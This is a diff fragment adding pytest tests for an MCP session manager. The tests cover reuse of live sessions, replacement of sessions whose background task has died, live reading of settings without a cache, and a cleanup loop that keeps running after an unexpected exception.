+    @pytest.fixture
+    def manager(self):
+        return MCPSessionManager()
+
+    async def test_reuses_live_session_without_calling_list_tools(self, manager):
+        """A session whose background task is running must be reused immediately.
+
+        Without any list_tools() call.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        mock_session = AsyncMock()
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+        mock_task.cancel = MagicMock()
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session, mock_task, "streamable_http", False
+
+        try:
+            with patch.object(manager, "_create_streamable_http_session", side_effect=fake_create):
+                # First call creates the session.
+                s1 = await manager.get_session("ctx_1", connection_params, "streamable_http")
+                # Second call must reuse it — list_tools must never be called.
+                with patch.object(manager, "_validate_session_connectivity") as mock_validate:
+                    s2 = await manager.get_session("ctx_2", connection_params, "streamable_http")
+                    mock_validate.assert_not_called()
+            assert s1 is mock_session
+            assert s2 is mock_session
+            mock_session.list_tools.assert_not_awaited()
+        finally:
+            await manager.cleanup_all()
+
+    async def test_dead_task_triggers_new_session_without_list_tools(self, manager):
+        """A session whose background task is done must be cleaned up and replaced.
+
+        Again without any list_tools() call.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        mock_session_1 = AsyncMock()
+        mock_task_1 = AsyncMock()
+        mock_task_1.done = MagicMock(return_value=True)  # already dead
+        mock_task_1.cancel = MagicMock()
+
+        mock_session_2 = AsyncMock()
+        mock_task_2 = AsyncMock()
+        mock_task_2.done = MagicMock(return_value=False)
+        mock_task_2.cancel = MagicMock()
+
+        # The dead session is seeded directly, so fake_create is only called
+        # once — to produce the replacement session (mock_session_2).
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session_2, mock_task_2, "streamable_http", False
+
+        try:
+            with patch.object(manager, "_create_streamable_http_session", side_effect=fake_create):
+                # Seed the dead session directly.
+                server_key = manager._get_server_key(connection_params, "streamable_http")
+                manager.sessions_by_server[server_key] = {
+                    "sessions": {
+                        f"{server_key}_0": {
+                            "session": mock_session_1,
+                            "task": mock_task_1,
+                            "type": "streamable_http",
+                            "last_used": 0,
+                        }
+                    },
+                    "last_cleanup": 0,
+                }
+                manager._session_id_counters[server_key] = 1
+
+                with patch.object(manager, "_validate_session_connectivity") as mock_validate:
+                    result = await manager.get_session("ctx_new", connection_params, "streamable_http")
+                    mock_validate.assert_not_called()
+
+            assert result is mock_session_2
+        finally:
+            await manager.cleanup_all()
+
+
+class TestSettingsCacheNotStale:
+    """_get_mcp_setting() must read live from the settings service, not a cache.
+
+    The old code used a module-level _mcp_settings_cache dict.  If settings
+    changed after startup (hot-reload, test fixture tear-down) the cached value
+    would be used forever, masking bugs and causing hard-to-reproduce failures.
+    """
+
+    def test_reads_live_value_on_each_call(self):
+        """Two consecutive calls must reflect the current settings value.
+
+        Not a value cached from a previous call.
+        """
+        call_count = 0
+        values = [10, 20]
+
+        class FakeSettings:
+            @property
+            def mcp_session_cleanup_interval(self):
+                nonlocal call_count
+                v = values[min(call_count, len(values) - 1)]
+                call_count += 1
+                return v
+
+        fake_service = MagicMock()
+        fake_service.settings = FakeSettings()
+
+        with patch.object(util, "get_settings_service", return_value=fake_service):
+            first = util._get_mcp_setting("mcp_session_cleanup_interval")
+            second = util._get_mcp_setting("mcp_session_cleanup_interval")
+
+        assert first == 10
+        assert second == 20
+
+
+class TestPeriodicCleanupSurvivesUnexpectedError:
+    """_periodic_cleanup() must keep running even if an unexpected exception fires.
+
+    The old narrow ``except (RuntimeError, KeyError, ...)`` clause would let
+    other exceptions propagate, silently killing the cleanup task forever.
+    Sessions would then never be reaped until the process was restarted.
+    """
+
+    async def test_cleanup_loop_continues_after_unexpected_exception(self):
+        """An unexpected exception inside cleanup must be swallowed.
+
+        The loop must keep sleeping and retrying.
+        """
+        manager = MCPSessionManager()
+        iterations: list[int] = []
+        stop = asyncio.Event()
+
+        async def fake_cleanup_idle():
+            iterations.append(1)
+            if len(iterations) == 1:
+                msg = "unexpected error from cleanup"
+                raise TypeError(msg)
+            if len(iterations) >= 2:
+                stop.set()
+
+        try:
+            with (
+                patch.object(manager, "_cleanup_idle_sessions", side_effect=fake_cleanup_idle),
+                patch.object(util, "get_session_cleanup_interval", return_value=0.01),
+            ):
+                task = asyncio.create_task(manager._periodic_cleanup())
+                await asyncio.wait_for(stop.wait(), timeout=2.0)
+                task.cancel()
+                with suppress(asyncio.CancelledError):
+                    await task
+
+            # Both iterations ran — the loop survived the first exception.
+            assert len(iterations) >= 2
+        finally:
+            await manager.cleanup_all()
